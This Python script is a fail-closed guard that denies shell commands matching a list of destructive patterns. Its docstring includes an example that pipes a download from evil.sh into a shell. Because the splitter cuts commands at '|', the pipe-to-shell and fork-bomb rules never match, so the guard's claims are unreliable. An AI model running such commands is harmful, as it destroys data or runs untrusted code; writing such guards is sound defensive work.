#!/usr/bin/env python3
"""dangerous_shell_guard.py -- pre-execution guard for `guard.dangerous-shell`.

Article 7: a guard fails closed. Every path out of this script that is not an explicit
allow is a deny, including malformed input and unexpected exceptions. A guard that failed
open would be worse than no guard, because it would create the appearance of one.

Compound commands are split before matching. Without that, an allow-list entry for
`npm test *` would also permit `npm test; curl evil.sh | sh`.

Script I/O Contract (SS26):
  PEARL_INPUT (or stdin): JSON object
    command  str    the command line about to be executed (required)
    phase    str    pre | post (informational)
  stdout: a guard verdict on the last line
  stderr: diagnostics

Exit codes:
  0 = allow
  1 = deny
  2 = input error -- also a deny, and reported as one
"""

import json
import os
import re
import sys

# Patterns that are never allowed to run. Each entry is (regex, why).
#
# The list is intentionally about *irreversibility* rather than about tidiness: these are
# the commands whose damage cannot be undone by re-running the task.
DENY_PATTERNS = [
    (r"\brm\s+(-[a-zA-Z]*\s+)*-?[a-zA-Z]*[rf][a-zA-Z]*\s+/(\s|$)", "recursive delete of the filesystem root"),
    (r"\brm\s+-[a-zA-Z]*r[a-zA-Z]*f|\brm\s+-[a-zA-Z]*f[a-zA-Z]*r", "recursive force delete"),
    (r"\bRemove-Item\b.*-Recurse\b.*-Force\b", "recursive force delete"),
    (r"\bRemove-Item\b.*-Force\b.*-Recurse\b", "recursive force delete"),
    (r"\bmkfs(\.|\s)", "filesystem format"),
    (r"\bdd\s+.*\bof=/dev/", "raw write to a block device"),
    (r"\b(shutdown|reboot|halt|poweroff)\b", "host power state change"),
    (r"\bsudo\b", "privilege escalation"),
    (r"\bchmod\s+(-[a-zA-Z]+\s+)*777\b", "world-writable permissions"),
    (r":\(\)\s*\{.*\};\s*:", "fork bomb"),
    (r"\b(curl|wget|iwr|Invoke-WebRequest)\b[^|;]*\|\s*(sh|bash|zsh|pwsh|powershell|python)\b",
     "piping a download straight into an interpreter"),
    (r"\bgit\s+push\b.*(--force|-f)\b", "force push rewrites published history"),
    (r"\bgit\s+reset\b.*--hard\b", "discards uncommitted work irreversibly"),
    (r"\bgit\s+clean\b.*-[a-zA-Z]*f", "deletes untracked files irreversibly"),
    (r"\bDROP\s+(TABLE|DATABASE|SCHEMA)\b", "destructive schema change"),
    (r"\bTRUNCATE\s+TABLE\b", "destructive data deletion"),
    (r"\b(Stop-Computer|Restart-Computer)\b", "host power state change"),
    (r"\bkill\s+-9\s+1\b", "killing init"),
    (r"/dev/(sd|nvme|hd)[a-z]", "direct disk device access"),
]

# Separators that start a new command within one line.
COMMAND_SEPARATORS = re.compile(r"&&|\|\||[;&|\n]")


def verdict(decision, reason, matched=None, code=0):
    payload = {"verdict": decision, "reason": reason}
    if matched:
        payload["matched"] = matched
    print(json.dumps(payload))
    sys.exit(code)


def deny(reason, matched=None, code=1):
    print(f"DENY: {reason}", file=sys.stderr)
    verdict("deny", reason, matched, code)


def segments(command):
    """Split a command line into individually-checkable commands."""
    return [s.strip() for s in COMMAND_SEPARATORS.split(command) if s.strip()]


def main():
    raw = os.environ.get("PEARL_INPUT", "") or sys.stdin.read()
    if not raw.strip():
        deny("no input provided; a guard with nothing to inspect must deny", code=2)

    try:
        payload = json.loads(raw)
    except json.JSONDecodeError as exc:
        deny(f"could not parse guard input: {exc}", code=2)

    if not isinstance(payload, dict):
        deny("guard input must be a JSON object", code=2)

    command = payload.get("command")
    if not isinstance(command, str) or not command.strip():
        deny("guard input carries no 'command' to inspect", code=2)

    parts = segments(command)
    print(f"inspecting {len(parts)} command segment(s)", file=sys.stderr)

    for part in parts:
        for pattern, why in DENY_PATTERNS:
            if re.search(pattern, part, flags=re.IGNORECASE):
                deny(why, matched=part)

    print("no dangerous pattern matched", file=sys.stderr)
    verdict("allow", f"none of {len(DENY_PATTERNS)} deny patterns matched", code=0)


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:  # noqa: BLE001 -- fail-closed is the point
        # An unexpected exception is exactly the case Article 7 is about: the guard could
        # not reach a conclusion, so it must not allow.
        deny(f"guard crashed and therefore denies: {exc!r}", code=2)
